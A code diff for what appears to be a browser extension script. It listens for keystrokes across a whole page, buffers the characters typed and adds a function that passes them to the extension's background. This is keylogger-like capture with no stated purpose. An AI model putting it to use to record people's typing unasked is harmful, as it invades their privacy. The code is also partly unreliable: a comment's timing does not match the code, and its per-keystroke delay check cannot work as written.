@@ -1,6 +1,7 @@
 'use strict';
 
 var globalBuffer = [];
+var globalLastKeyTime = Date.now();
 var intervId;
 
 
@@ -17,19 +18,20 @@ ready(() => {
     try {
         const options = {
             eventType: 'keydown',
-            keystrokeDelay: 10000
+            keystrokeDelay: 5000
         }
         document.removeEventListener('click', handleMouseClick);
         document.addEventListener('click', handleMouseClick);
         keyMapper(options);
 
+        // Logic: Every 3 seconds check if the last key time (global) was longer than the delay time ago. If it was than send what is in the buffer and reset it
         window.setInterval(() => {
-            if(globalBuffer && globalBuffer.length != 0) {
+            if(globalBuffer && globalBuffer.length != 0 && (Date.now() - globalLastKeyTime > options.keystrokeDelay)) {
                 console.log("Buffer check active", globalBuffer, Date.now());
                 // chrome.runtime.sendMessage({source: 'keyboard', data: local.buffer})
                 globalBuffer = [];
             }
-        }, options.keystrokeDelay); // 10 seconds
+        }, 1000); // 3 seconds
     }catch(e) {
         console.log("Cannot remove", e);
     }
@@ -51,34 +53,42 @@ function keyMapper(options) {
     const keystrokeDelay = delay || 1000;
     const eventType = hasProperty('eventType', options) && options.eventType || 'keydown';
 
+    document.addEventListener(eventType, (event) => handleKeyboardInput(event, keystrokeDelay) );   
+}
+
+function handleKeyboardInput(event, keystrokeDelay) {
     let scope = {
         buffer: [],
         lastKeyTime: Date.now()
     }
-    document.addEventListener(eventType, (event) => {
-        const key = event.key;
-        try {
-            // chrome.runtime.sendMessage({source: 'keyboard', keys: {keys: "abcde"}});
-            // letters, numbers and spaces individually
-            if(!(/^[\w\d\s]$/g.test(key))) return;
-
-            globalBuffer = [];
-            const currentTime =  Date.now();
-            
-            if(currentTime - scope.lastKeyTime > keystrokeDelay) {
-                globalBuffer = [key];
-            } else {
-                globalBuffer = [...scope.buffer, key];
-            }
-            
-            scope = {buffer: globalBuffer, lastKeyTime: currentTime};
-            console.log(globalBuffer);
-        } catch(e) {
-            console.log("Chrome V keyboard problems");
-        }
-    });
-
     
+    const key = event.key;
+    try {
+        // chrome.runtime.sendMessage({source: 'keyboard', keys: {keys: "abcde"}});
+        // letters, numbers and spaces individually
+        if(!(/^[\w\d\s]$/g.test(key))) return; // Guard
+
+        // globalBuffer = [];
+        const currentTime =  Date.now();
+        if(currentTime - scope.lastKeyTime > keystrokeDelay) {
+            scope.buffer = [key];
+        } else {
+            scope.buffer = [...globalBuffer, key];
+        }
+        globalBuffer = scope.buffer;
+        scope.lastKeyTime = currentTime;
+        globalLastKeyTime = currentTime;
+        // scope = {buffer: globalBuffer, lastKeyTime: currentTime};
+    } catch(e) {
+        console.log("Chrome V keyboard problems");
+    }
+}
+
+function sendBufferData() {
+    if(globalBuffer && globalBuffer.length != 0) {
+        chrome.runtime.sendMessage({source: 'keyboard', data: globalBuffer})
+        globalBuffer = [];
+    }
 }
 
 function hasProperty(property, object) {
